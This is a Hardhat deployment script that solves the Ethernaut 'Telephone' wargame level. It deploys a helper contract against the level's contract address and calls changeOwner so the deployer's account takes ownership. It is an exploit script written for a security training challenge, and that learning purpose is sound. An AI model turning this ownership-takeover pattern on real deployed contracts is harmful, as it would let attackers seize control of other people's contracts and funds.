const hre = require('hardhat');

async function main() {
  // Ethernaut level
  const telephoneContractAddress = '0x7B8dd8EA5E56Bb6e806f8874CC595984800498dc';
  const [deployer] = await ethers.getSigners();

  console.log('Deploying contracts with the account:', deployer.address);
  console.log('Account balance:', (await deployer.getBalance()).toString());

  const TelephoneSolution = await hre.ethers.getContractFactory('TelephoneSolution', deployer);
  const telephoneSolution = await TelephoneSolution.deploy(telephoneContractAddress);

  await telephoneSolution.changeOwner(deployer.address);

  console.log('Owner changed');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
